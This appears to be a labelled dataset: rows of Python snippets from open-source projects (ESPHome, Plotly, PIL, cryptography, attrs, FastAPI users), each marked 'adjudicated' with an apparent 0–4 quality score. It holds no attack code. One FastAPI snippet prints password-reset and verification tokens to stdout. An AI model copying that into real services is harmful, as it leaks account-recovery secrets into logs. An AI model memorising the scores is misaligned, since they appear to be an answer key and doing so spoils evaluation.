            files = [(os.path.getmtime(f), f) for f in files]
            files.sort()
            files.reverse()

            log.info(""%d file(s) matching %s"", len(files), pattern)
            files = files[self.keep:]
            for (t, f) in files:
                log.info(""Deleting %s"", f)
                if not self.dry_run:
                    if os.path.isdir(f):
                        shutil.rmtree(f)
                    else:
                        os.unlink(f)"
328	adjudicated	0	"from esphome.components import fan
import esphome.config_validation as cv
import esphome.codegen as cg
from esphome.const import CONF_OUTPUT_ID, CONF_SPEED_COUNT, CONF_SWITCH_DATAPOINT
from .. import tuya_ns, CONF_TUYA_ID, Tuya

DEPENDENCIES = [""tuya""]

CONF_SPEED_DATAPOINT = ""speed_datapoint""
CONF_OSCILLATION_DATAPOINT = ""oscillation_datapoint""
CONF_DIRECTION_DATAPOINT = ""direction_datapoint""

TuyaFan = tuya_ns.class_(""TuyaFan"", cg.Component, fan.Fan)

CONFIG_SCHEMA = cv.All(
    fan.FAN_SCHEMA.extend(
        {
            cv.GenerateID(CONF_OUTPUT_ID): cv.declare_id(TuyaFan),
            cv.GenerateID(CONF_TUYA_ID): cv.use_id(Tuya),
            cv.Optional(CONF_OSCILLATION_DATAPOINT): cv.uint8_t,
            cv.Optional(CONF_SPEED_DATAPOINT): cv.uint8_t,
            cv.Optional(CONF_SWITCH_DATAPOINT): cv.uint8_t,
            cv.Optional(CONF_DIRECTION_DATAPOINT): cv.uint8_t,
            cv.Optional(CONF_SPEED_COUNT, default=3): cv.int_range(min=1, max=256),
        }
    ).extend(cv.COMPONENT_SCHEMA),
    cv.has_at_least_one_key(CONF_SPEED_DATAPOINT, CONF_SWITCH_DATAPOINT),
)


async def to_code(config):
    parent = await cg.get_variable(config[CONF_TUYA_ID])

    var = cg.new_Pvariable(config[CONF_OUTPUT_ID], parent, config[CONF_SPEED_COUNT])
    await cg.register_component(var, config)
    await fan.register_fan(var, config)

    if CONF_SPEED_DATAPOINT in config:
        cg.add(var.set_speed_id(config[CONF_SPEED_DATAPOINT]))
    if CONF_SWITCH_DATAPOINT in config:
        cg.add(var.set_switch_id(config[CONF_SWITCH_DATAPOINT]))
    if CONF_OSCILLATION_DATAPOINT in config:
        cg.add(var.set_oscillation_id(config[CONF_OSCILLATION_DATAPOINT]))
    if CONF_DIRECTION_DATAPOINT in config:
        cg.add(var.set_direction_id(config[CONF_DIRECTION_DATAPOINT]))"
239	adjudicated	3	"# Copyright 2015 Google Inc. All rights reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

""""""
Sample App Engine application demonstrating how to use the Namespace Manager
API with Datastore.

For more information, see README.md.
""""""

# [START all]
from google.appengine.api import namespace_manager
from google.appengine.ext import ndb
import webapp2


class Counter(ndb.Model):
    count = ndb.IntegerProperty()


@ndb.transactional
def update_counter(name):
    """"""Increment the named counter by 1.""""""
    counter = Counter.get_by_id(name)
    if counter is None:
        counter = Counter(id=name, count=0)

    counter.count += 1
    counter.put()

    return counter.count


class DatastoreCounterHandler(webapp2.RequestHandler):
    """"""Increments counters in the global namespace as well as in whichever
    namespace is specified by the request, which is arbitrarily named 'default'
    if not specified.""""""

    def get(self, namespace='default'):
        global_count = update_counter('counter')

        # Save the current namespace.
        previous_namespace = namespace_manager.get_namespace()
        try:
            namespace_manager.set_namespace(namespace)
            namespace_count = update_counter('counter')
        finally:
            # Restore the saved namespace.
            namespace_manager.set_namespace(previous_namespace)

        self.response.write('Global: {}, Namespace {}: {}'.format(
            global_count, namespace, namespace_count))


app = webapp2.WSGIApplication([
    (r'/datastore', DatastoreCounterHandler),
    (r'/datastore/(.*)', DatastoreCounterHandler)
], debug=True)
# [END all]"
379	adjudicated	0	"from typing import Optional

from fastapi import Depends, Request
from fastapi_users import BaseUserManager, FastAPIUsers, IntegerIDMixin
from fastapi_users.authentication import AuthenticationBackend, BearerTransport, CookieTransport, JWTStrategy
from fastapi_users.db import SQLAlchemyUserDatabase

import crud
from app import models
from app.deps import get_db
from .db import User, get_user_db
from .secrets import secrets

class UserManager(IntegerIDMixin, BaseUserManager[User, int]):
    reset_password_token_secret = secrets['SECRET_KEY']
    verification_token_secret = secrets['SECRET_KEY']

    async def on_after_register(self, user: User, request: Optional[Request] = None):
        print(f""User {user.id} has registered."")

    async def on_after_forgot_password(
        self, user: User, token: str, request: Optional[Request] = None
    ):
        print(f""User {user.id} has forgot their password. Reset token: {token}"")

    async def on_after_request_verify(
        self, user: User, token: str, request: Optional[Request] = None
    ):
        print(f""Verification requested for user {user.id}. Verification token: {token}"")


async def get_user_manager(user_db: SQLAlchemyUserDatabase = Depends(get_user_db)):
    yield UserManager(user_db)


bearer_transport = BearerTransport(tokenUrl=""auth/jwt/login"")


def get_jwt_strategy() -> JWTStrategy:
    return JWTStrategy(secret=secrets['SECRET_KEY'], lifetime_seconds=3600)


jwt_auth_backend = AuthenticationBackend(
    name=""jwt"",
    transport=bearer_transport,
    get_strategy=get_jwt_strategy,
)

cookie_transport = CookieTransport(cookie_max_age=3600)

cookie_auth_backend = AuthenticationBackend(
    name=""cookie"",
    transport=cookie_transport,
    get_strategy=get_jwt_strategy,
)

fastapi_users = FastAPIUsers[User, int](get_user_manager, [jwt_auth_backend, cookie_auth_backend])

current_active_user = fastapi_users.current_user(active=True)

async def get_current_profile(user: User = Depends(current_active_user), db = Depends(get_db)):
    profile = await crud.read(_id=user.id, db=db, model=models.Profile)
    return profile"
437	adjudicated	3	"import sys
import platform


__all__ = ['install', 'NullFinder', 'Protocol']


try:
    from typing import Protocol
except ImportError:  # pragma: no cover
    # Python 3.7 compatibility
    from ..typing_extensions import Protocol  # type: ignore


def install(cls):
    """"""
    Class decorator for installation on sys.meta_path.

    Adds the backport DistributionFinder to sys.meta_path and
    attempts to disable the finder functionality of the stdlib
    DistributionFinder.
    """"""
    sys.meta_path.append(cls())
    disable_stdlib_finder()
    return cls


def disable_stdlib_finder():
    """"""
    Give the backport primacy for discovering path-based distributions
    by monkey-patching the stdlib O_O.

    See #91 for more background for rationale on this sketchy
    behavior.
    """"""

    def matches(finder):
        return getattr(
            finder, '__module__', None
        ) == '_frozen_importlib_external' and hasattr(finder, 'find_distributions')

    for finder in filter(matches, sys.meta_path):  # pragma: nocover
        del finder.find_distributions


class NullFinder:
    """"""
    A ""Finder"" (aka ""MetaClassFinder"") that never finds any modules,
    but may find distributions.
    """"""

    @staticmethod
    def find_spec(*args, **kwargs):
        return None

    # In Python 2, the import system requires finders
    # to have a find_module() method, but this usage
    # is deprecated in Python 3 in favor of find_spec().
    # For the purposes of this finder (i.e. being present
    # on sys.meta_path but having no other import
    # system functionality), the two methods are identical.
    find_module = find_spec


def pypy_partial(val):
    """"""
    Adjust for variable stacklevel on partial under PyPy.

    Workaround for #327.
    """"""
    is_pypy = platform.python_implementation() == 'PyPy'
    return val + is_pypy"
466	adjudicated	1	"import argparse
import unittest
from typing import Any, Dict, Sequence

import torch
from fairseq.models import transformer

from tests.test_roberta import FakeTask


def mk_sample(tok: Sequence[int] = None, batch_size: int = 2) -> Dict[str, Any]:
    if not tok:
        tok = [10, 11, 12, 13, 14, 15, 2]

    batch = torch.stack([torch.tensor(tok, dtype=torch.long)] * batch_size)
    sample = {
        ""net_input"": {
            ""src_tokens"": batch,
            ""prev_output_tokens"": batch,
            ""src_lengths"": torch.tensor(
                [len(tok)] * batch_size, dtype=torch.long, device=batch.device
            ),
        },
        ""target"": batch[:, 1:],
    }
    return sample


def mk_transformer(**extra_args: Any):
    overrides = {
        # Use characteristics dimensions
        ""encoder_embed_dim"": 12,
        ""encoder_ffn_embed_dim"": 14,
        ""decoder_embed_dim"": 12,
        ""decoder_ffn_embed_dim"": 14,
        # Disable dropout so we have comparable tests.
        ""dropout"": 0,
        ""attention_dropout"": 0,
        ""activation_dropout"": 0,
        ""encoder_layerdrop"": 0,
    }
    overrides.update(extra_args)
    # Overrides the defaults from the parser
    args = argparse.Namespace(**overrides)
    transformer.tiny_architecture(args)

    torch.manual_seed(0)
    task = FakeTask(args)
    return transformer.TransformerModel.build_model(args, task)


class TransformerTestCase(unittest.TestCase):
    def test_forward_backward(self):
        model = mk_transformer(encoder_embed_dim=12, decoder_embed_dim=12)
        sample = mk_sample()
        o, _ = model.forward(**sample[""net_input""])
        loss = o.sum()
        loss.backward()

    def test_different_encoder_decoder_embed_dim(self):
        model = mk_transformer(encoder_embed_dim=12, decoder_embed_dim=16)
        sample = mk_sample()
        o, _ = model.forward(**sample[""net_input""])
        loss = o.sum()
        loss.backward()"
452	adjudicated	3	"import os
import string
import urllib.parse
import urllib.request
from typing import Optional

from .compat import WINDOWS


def get_url_scheme(url):
    # type: (str) -> Optional[str]
    if "":"" not in url:
        return None
    return url.split("":"", 1)[0].lower()


def path_to_url(path):
    # type: (str) -> str
    """"""
    Convert a path to a file: URL.  The path will be made absolute and have
    quoted path parts.
    """"""
    path = os.path.normpath(os.path.abspath(path))
    url = urllib.parse.urljoin(""file:"", urllib.request.pathname2url(path))
    return url


def url_to_path(url):
    # type: (str) -> str
    """"""
    Convert a file: URL to a path.
    """"""
    assert url.startswith(
        ""file:""
    ), f""You can only turn file: urls into filenames (not {url!r})""

    _, netloc, path, _, _ = urllib.parse.urlsplit(url)

    if not netloc or netloc == ""localhost"":
        # According to RFC 8089, same as empty authority.
        netloc = """"
    elif WINDOWS:
        # If we have a UNC path, prepend UNC share notation.
        netloc = ""\\\\"" + netloc
    else:
        raise ValueError(
            f""non-local file URIs are not supported on this platform: {url!r}""
        )

    path = urllib.request.url2pathname(netloc + path)

    # On Windows, urlsplit parses the path as something like ""/C:/Users/foo"".
    # This creates issues for path-related functions like io.open(), so we try
    # to detect and strip the leading slash.
    if (
        WINDOWS
        and not netloc  # Not UNC.
        and len(path) >= 3
        and path[0] == ""/""  # Leading slash to strip.
        and path[1] in string.ascii_letters  # Drive letter.
        and path[2:4] in ("":"", "":/"")  # Colon + end of string, or colon + absolute path.
    ):
        path = path[1:]

    return path"
512	adjudicated	0	"# -*- coding: utf-8 -*-

# Copyright 2010 Dirk Holtwick, holtwick.it
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import six
import logging


from xhtml2pdf.util import pisaTempFile, getFile, PyPDF2


log = logging.getLogger(""xhtml2pdf"")


class pisaPDF:
    def __init__(self, capacity=-1):
        self.capacity = capacity
        self.files = []

    def addFromURI(self, url, basepath=None):
        obj = getFile(url, basepath)
        if obj and (not obj.notFound()):
            self.files.append(obj.getFile())

    addFromFileName = addFromURI

    def addFromFile(self, f):
        if hasattr(f, ""read""):
            self.files.append(f)
        else:
            self.addFromURI(f)

    def addFromString(self, data):
        self.files.append(pisaTempFile(data, capacity=self.capacity))

    def addDocument(self, doc):
        if hasattr(doc.dest, ""read""):
            self.files.append(doc.dest)

    def join(self, file=None):
        output = PyPDF2.PdfFileWriter()
        for pdffile in self.files:
            input = PyPDF2.PdfFileReader(pdffile)
            for pageNumber in six.moves.range(input.getNumPages()):
                output.addPage(input.getPage(pageNumber))

        if file is not None:
            output.write(file)
            return file
        out = pisaTempFile(capacity=self.capacity)
        output.write(out)
        return out.getvalue()

    getvalue = join
    __str__ = join"
403	adjudicated	2	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""box"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
51	adjudicated	4	"""""""
Unopinionated display configuration.
""""""

from __future__ import annotations

import locale
import sys

from pandas._config import config as cf

# -----------------------------------------------------------------------------
# Global formatting options
_initial_defencoding: str | None = None


def detect_console_encoding() -> str:
    """"""
    Try to find the most capable encoding supported by the console.
    slightly modified from the way IPython handles the same issue.
    """"""
    global _initial_defencoding

    encoding = None
    try:
        encoding = sys.stdout.encoding or sys.stdin.encoding
    except (AttributeError, OSError):
        pass

    # try again for something better
    if not encoding or ""ascii"" in encoding.lower():
        try:
            encoding = locale.getpreferredencoding()
        except locale.Error:
            # can be raised by locale.setlocale(), which is
            #  called by getpreferredencoding
            #  (on some systems, see stdlib locale docs)
            pass

    # when all else fails. this will usually be ""ascii""
    if not encoding or ""ascii"" in encoding.lower():
        encoding = sys.getdefaultencoding()

    # GH#3360, save the reported defencoding at import time
    # MPL backends may change it. Make available for debugging.
    if not _initial_defencoding:
        _initial_defencoding = sys.getdefaultencoding()

    return encoding


pc_encoding_doc = """"""
: str/unicode
    Defaults to the detected encoding of the console.
    Specifies the encoding to be used for strings returned by to_string,
    these are generally strings meant to be displayed on the console.
""""""

with cf.config_prefix(""display""):
    cf.register_option(
        ""encoding"", detect_console_encoding(), pc_encoding_doc, validator=cf.is_text
    )"
280	adjudicated	3	"from django.urls import get_script_prefix, resolve


def get_breadcrumbs(url, request=None):
    """"""
    Given a url returns a list of breadcrumbs, which are each a
    tuple of (name, url).
    """"""
    from rest_framework.reverse import preserve_builtin_query_params
    from rest_framework.views import APIView

    def breadcrumbs_recursive(url, breadcrumbs_list, prefix, seen):
        """"""
        Add tuples of (name, url) to the breadcrumbs list,
        progressively chomping off parts of the url.
        """"""
        try:
            (view, unused_args, unused_kwargs) = resolve(url)
        except Exception:
            pass
        else:
            # Check if this is a REST framework view,
            # and if so add it to the breadcrumbs
            cls = getattr(view, ""cls"", None)
            initkwargs = getattr(view, ""initkwargs"", {})
            if cls is not None and issubclass(cls, APIView):
                # Don't list the same view twice in a row.
                # Probably an optional trailing slash.
                if not seen or seen[-1] != view:
                    c = cls(**initkwargs)
                    name = c.get_view_name()
                    insert_url = preserve_builtin_query_params(prefix + url, request)
                    breadcrumbs_list.insert(0, (name, insert_url))
                    seen.append(view)

        if url == """":
            # All done
            return breadcrumbs_list

        elif url.endswith(""/""):
            # Drop trailing slash off the end and continue to try to
            # resolve more breadcrumbs
            url = url.rstrip(""/"")
            return breadcrumbs_recursive(url, breadcrumbs_list, prefix, seen)

        # Drop trailing non-slash off the end and continue to try to
        # resolve more breadcrumbs
        url = url[: url.rfind(""/"") + 1]
        return breadcrumbs_recursive(url, breadcrumbs_list, prefix, seen)

    prefix = get_script_prefix().rstrip(""/"")
    url = url[len(prefix) :]
    return breadcrumbs_recursive(url, [], prefix, [])"
111	adjudicated	2	"import _plotly_utils.basevalidators


class TextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""textfont"", parent_name=""funnelarea"", **kwargs):
        super(TextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Textfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
391	adjudicated	1	"#
# The Python Imaging Library.
# $Id$
#
# XV Thumbnail file handler by Charles E. ""Gene"" Cash
# (gcash@magicnet.net)
#
# see xvcolor.c and xvbrowse.c in the sources to John Bradley's XV,
# available from ftp://ftp.cis.upenn.edu/pub/xv/
#
# history:
# 98-08-15 cec  created (b/w only)
# 98-12-09 cec  added color palette
# 98-12-28 fl   added to PIL (with only a few very minor modifications)
#
# To do:
# FIXME: make save work (this requires quantization support)
#

from . import Image, ImageFile, ImagePalette
from ._binary import o8

_MAGIC = b""P7 332""

# standard color palette for thumbnails (RGB332)
PALETTE = b""""
for r in range(8):
    for g in range(8):
        for b in range(4):
            PALETTE = PALETTE + (
                o8((r * 255) // 7) + o8((g * 255) // 7) + o8((b * 255) // 3)
            )


def _accept(prefix):
    return prefix[:6] == _MAGIC


##
# Image plugin for XV thumbnail images.


class XVThumbImageFile(ImageFile.ImageFile):

    format = ""XVThumb""
    format_description = ""XV thumbnail image""

    def _open(self):

        # check magic
        if not _accept(self.fp.read(6)):
            msg = ""not an XV thumbnail file""
            raise SyntaxError(msg)

        # Skip to beginning of next line
        self.fp.readline()

        # skip info comments
        while True:
            s = self.fp.readline()
            if not s:
                msg = ""Unexpected EOF reading XV thumbnail file""
                raise SyntaxError(msg)
            if s[0] != 35:  # ie. when not a comment: '#'
                break

        # parse header line (already read)
        s = s.strip().split()

        self.mode = ""P""
        self._size = int(s[0]), int(s[1])

        self.palette = ImagePalette.raw(""RGB"", PALETTE)

        self.tile = [(""raw"", (0, 0) + self.size, self.fp.tell(), (self.mode, 0, 1))]


# --------------------------------------------------------------------

Image.register_open(XVThumbImageFile.format, XVThumbImageFile, _accept)"
140	adjudicated	2	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""font"", parent_name=""bar.hoverlabel"", **kwargs):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
362	adjudicated	3	"import pytest
import pytest_asyncio

from rtsu_students_bot.rtsu import RTSUApi

pytest_plugins = ('pytest_asyncio',)

TEST_DATA = {
    ""login"": ""your login"",
    ""password"": ""your pass"",
}


@pytest_asyncio.fixture()
async def rtsu_client():
    """"""
    Initializes client
    :return: Prepared `RTSUApi` client
    """"""

    async with RTSUApi() as api:
        yield api


@pytest.mark.asyncio
async def test_rtsu_login(rtsu_client: RTSUApi):
    """"""
    Tests rtsu login
    :param rtsu_client: A RTSU API client
    :return:
    """"""

    resp = await rtsu_client.auth(TEST_DATA.get(""login""), TEST_DATA.get(""password""))

    assert resp.token is not None


@pytest.mark.asyncio
async def test_rtsu_profile_fetching(rtsu_client: RTSUApi):
    """"""
    Tests rtsu profile fetching
    :param rtsu_client:
    :return:
    """"""

    await rtsu_client.auth(TEST_DATA.get(""login""), TEST_DATA.get(""password""))

    profile = await rtsu_client.get_profile()

    assert profile is not None
    assert profile.full_name is not None


@pytest.mark.asyncio
async def test_rtsu_academic_years_fetching(rtsu_client: RTSUApi):
    """"""
    Tests rtsu academic years fetching
    :param rtsu_client:
    :return:
    """"""

    await rtsu_client.auth(TEST_DATA.get(""login""), TEST_DATA.get(""password""))

    years = await rtsu_client.get_academic_years()

    assert type(years) == list
    assert len(years) > 0


@pytest.mark.asyncio
async def test_rtsu_academic_year_subjects_fetching(rtsu_client: RTSUApi):
    """"""
    Tests rtsu academic year fetching
    :param rtsu_client:
    :return:
    """"""

    await rtsu_client.auth(TEST_DATA.get(""login""), TEST_DATA.get(""password""))

    ac_years = await rtsu_client.get_academic_years()
    year = ac_years[0].id
    years = await rtsu_client.get_academic_year_subjects(year)

    assert type(years) == list
    assert len(years) > 0"
333	adjudicated	0	"# This file is dual licensed under the terms of the Apache License, Version
# 2.0, and the BSD License. See the LICENSE file in the root of this repository
# for complete details.


import typing

from cryptography import utils
from cryptography.exceptions import (
    AlreadyFinalized,
    InvalidKey,
    UnsupportedAlgorithm,
    _Reasons,
)
from cryptography.hazmat.primitives import constant_time, hashes
from cryptography.hazmat.primitives.kdf import KeyDerivationFunction


class PBKDF2HMAC(KeyDerivationFunction):
    def __init__(
        self,
        algorithm: hashes.HashAlgorithm,
        length: int,
        salt: bytes,
        iterations: int,
        backend: typing.Any = None,
    ):
        from cryptography.hazmat.backends.openssl.backend import (
            backend as ossl,
        )

        if not ossl.pbkdf2_hmac_supported(algorithm):
            raise UnsupportedAlgorithm(
                ""{} is not supported for PBKDF2 by this backend."".format(
                    algorithm.name
                ),
                _Reasons.UNSUPPORTED_HASH,
            )
        self._used = False
        self._algorithm = algorithm
        self._length = length
        utils._check_bytes(""salt"", salt)
        self._salt = salt
        self._iterations = iterations

    def derive(self, key_material: bytes) -> bytes:
        if self._used:
            raise AlreadyFinalized(""PBKDF2 instances can only be used once."")
        self._used = True

        utils._check_byteslike(""key_material"", key_material)
        from cryptography.hazmat.backends.openssl.backend import backend

        return backend.derive_pbkdf2_hmac(
            self._algorithm,
            self._length,
            self._salt,
            self._iterations,
            key_material,
        )

    def verify(self, key_material: bytes, expected_key: bytes) -> None:
        derived_key = self.derive(key_material)
        if not constant_time.bytes_eq(derived_key, expected_key):
            raise InvalidKey(""Keys do not match."")"
273	adjudicated	0	"# Copyright (C) 2017-2023 The Sipwise Team - http://sipwise.com
#
# This program is free software: you can redistribute it and/or modify it
# under the terms of the GNU General Public License as published by the Free
# Software Foundation, either version 3 of the License, or (at your option)
# any later version.
#
# This program is distributed in the hope that it will be useful, but WITHOUT
# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
# FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
# more details.
#
# You should have received a copy of the GNU General Public License along
# with this program.  If not, see <http://www.gnu.org/licenses/>.
from django.contrib import admin
from import_export import resources
from import_export.admin import ExportActionModelAdmin
from import_export.admin import ImportExportModelAdmin

from . import models


class BuildReleaseResource(resources.ModelResource):
    class Meta:
        model = models.BuildRelease


@admin.register(models.BuildRelease)
class BuildReleaseAdmin(ImportExportModelAdmin, ExportActionModelAdmin):
    resource_class = BuildReleaseResource
    list_filter = (""release"",)
    readonly_fields = (
        ""projects"",
        ""triggered_projects"",
        ""built_projects"",
        ""failed_projects"",
        ""pool_size"",
        ""triggered_jobs"",
        ""build_deps"",
    )
    modify_readonly_fields = (
        ""uuid"",
        ""release"",
    ) + readonly_fields

    def get_readonly_fields(self, request, obj=None):
        if obj is None:
            return self.readonly_fields
        return self.modify_readonly_fields

    def save_model(self, request, obj, form, change):
        if change:
            super(BuildReleaseAdmin, self).save_model(
                request, obj, form, change
            )
        else:
            new_obj = models.BuildRelease.objects.create_build_release(
                uuid=obj.uuid, release=obj.release
            )
            obj.pk = new_obj.pk"
174	adjudicated	1	"# Copyright 2017-present Open Networking Foundation
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
from bitstring import BitArray
import structlog

log = structlog.get_logger()

class IndexPool(object):
    def __init__(self, max_entries, offset):
        self.max_entries = max_entries
        self.offset = offset
        self.indices = BitArray(self.max_entries)

    def get_next(self):
        try:
            _pos = self.indices.find('0b0')
            self.indices.set(1, _pos)
            return self.offset + _pos[0]
        except IndexError:
            log.info(""exception-fail-to-allocate-id-all-bits-in-use"")
            return None

    def allocate(self, index):
        try:
            _pos = index - self.offset
            if not (0 <= _pos < self.max_entries):
                log.info(""{}-out-of-range"".format(index))
                return None
            if self.indices[_pos]:
                log.info(""{}-is-already-allocated"".format(index))
                return None
            self.indices.set(1, _pos)
            return index

        except IndexError:
            return None

    def release(self, index):
        index -= self.offset
        _pos = (index,)
        try:
            self.indices.set(0, _pos)
        except IndexError:
            log.info(""bit-position-{}-out-of-range"".format(index))

    #index or multiple indices to set all of them to 1 - need to be a tuple
    def pre_allocate(self, index):
        if(isinstance(index, tuple)):
            _lst = list(index)
            for i in range(len(_lst)):
                _lst[i] -= self.offset
            index = tuple(_lst)
            self.indices.set(1, index)"
34	adjudicated	4	"# Filename: cider.py
#
#
# Description: Describes the class to compute the CIDEr
# (Consensus-Based Image Description Evaluation) Metric
#          by Vedantam, Zitnick, and Parikh (http://arxiv.org/abs/1411.5726)
#
# Creation Date: Sun Feb  8 14:16:54 2015
#
# Authors: Ramakrishna Vedantam <vrama91@vt.edu> and
# Tsung-Yi Lin <tl483@cornell.edu>
from __future__ import absolute_import
from __future__ import division
from __future__ import print_function

from .cider_scorer import CiderScorer


class Cider:
    """"""
    Main Class to compute the CIDEr metric

    """"""
    def __init__(self, n=4, df=""corpus""):
        """"""
        Initialize the CIDEr scoring function
        : param n (int): n-gram size
        : param df (string): specifies where to get the IDF values from
                    takes values 'corpus', 'coco-train'
        : return: None
        """"""
        # set cider to sum over 1 to 4-grams
        self._n = n
        self._df = df
        self.cider_scorer = CiderScorer(n=self._n, df_mode=self._df)

    def compute_score(self, gts, res):
        """"""
        Main function to compute CIDEr score
        : param  gts (dict) : {image:tokenized reference sentence}
        : param res (dict)  : {image:tokenized candidate sentence}
        : return: cider (float) : computed CIDEr score for the corpus
        """"""

        # clear all the previous hypos and refs
        self.cider_scorer.clear()

        for res_id in res:

            hypo = res_id['caption']
            ref = gts[res_id['image_id']]

            # Sanity check.
            assert(type(hypo) is list)
            assert(len(hypo) == 1)
            assert(type(ref) is list)
            assert(len(ref) > 0)
            self.cider_scorer += (hypo[0], ref)

        (score, scores) = self.cider_scorer.compute_score()

        return score, scores

    def method(self):
        return ""CIDEr"""
125	adjudicated	0	"# SPDX-License-Identifier: MIT

import sys
import warnings

from functools import partial

from . import converters, exceptions, filters, setters, validators
from ._cmp import cmp_using
from ._config import get_run_validators, set_run_validators
from ._funcs import asdict, assoc, astuple, evolve, has, resolve_types
from ._make import (
    NOTHING,
    Attribute,
    Factory,
    attrib,
    attrs,
    fields,
    fields_dict,
    make_class,
    validate,
)
from ._next_gen import define, field, frozen, mutable
from ._version_info import VersionInfo


if sys.version_info < (3, 7):  # pragma: no cover
    warnings.warn(
        ""Running attrs on Python 3.6 is deprecated & we intend to drop ""
        ""support soon. If that's a problem for you, please let us know why & ""
        ""we MAY re-evaluate: <https://github.com/python-attrs/attrs/pull/993>"",
        DeprecationWarning,
    )

__version__ = ""22.2.0""
__version_info__ = VersionInfo._from_version_string(__version__)

__title__ = ""attrs""
__description__ = ""Classes Without Boilerplate""
__url__ = ""https://www.attrs.org/""
__uri__ = __url__
__doc__ = __description__ + "" <"" + __uri__ + "">""

__author__ = ""Hynek Schlawack""
__email__ = ""hs@ox.cx""

__license__ = ""MIT""
__copyright__ = ""Copyright (c) 2015 Hynek Schlawack""


s = attributes = attrs
ib = attr = attrib
dataclass = partial(attrs, auto_attribs=True)  # happy Easter ;)


class AttrsInstance:
    pass


__all__ = [
    ""Attribute"",
    ""AttrsInstance"",
    ""Factory"",
    ""NOTHING"",
    ""asdict"",
    ""assoc"",
    ""astuple"",
    ""attr"",
    ""attrib"",
    ""attributes"",
    ""attrs"",
    ""cmp_using"",
    ""converters"",
    ""define"",
    ""evolve"",
    ""exceptions"",
    ""field"",
    ""fields"",
    ""fields_dict"",
    ""filters"",
    ""frozen"",
    ""get_run_validators"",
    ""has"",
    ""ib"",
    ""make_class"",
    ""mutable"",
    ""resolve_types"",
    ""s"",
    ""set_run_validators"",
    ""setters"",
    ""validate"",
    ""validators"",
]"
